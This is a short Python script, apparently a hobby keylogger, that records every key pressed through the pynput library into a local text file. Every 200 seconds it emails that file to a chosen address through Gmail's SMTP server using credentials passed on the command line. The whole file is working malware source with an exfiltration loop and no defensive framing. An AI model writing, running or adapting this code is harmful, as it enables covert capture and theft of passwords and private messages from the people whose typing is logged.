# encode: utf-8

import smtplib
import time
import sys
from pynput import keyboard

params = sys.argv

try:
    send = params[1]
    password = params[2]
    receive = params[3]

    def sendEmail():
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(send, password)
        arq = open('texto.txt', 'r')
        msg = arq.read().encode('utf-8')
        s.sendmail(send, receive, msg)
        s.quit()
        print('Enviado com sucesso!')

    def onPress(key):
        try:
            with open('texto.txt', 'a') as txt:
                txt.write(key.char)

        except AttributeError:
            with open('texto.txt', 'a') as txt:
                if key == keyboard.Key.space:
                    txt.write(" ")

                elif key == keyboard.Key.caps_lock:
                    txt.write('<CAPS_LOCK>')
                    
                elif key == keyboard.Key.enter:
                    txt.write('\n')
                    
    def onRelease(key):
        if key == keyboard.Key.esc:
            return False
        
    with keyboard.Listener(
            on_press=onPress,
            on_release=onRelease) as listener:
                while True:
                    time.sleep(200)
                    sendEmail()

                listener.join()

except IndexError:
    yellow = '\033[35m'
    white = '\033[0m'
    print('ERROR!\nPlease set the parameters\n\nrun.py <email_to_send> <password> <email_to_receive> \n\n' + yellow + 'NOTE:' + white + ' is important that the password stay between SINGLE quotes like -> \'example\'')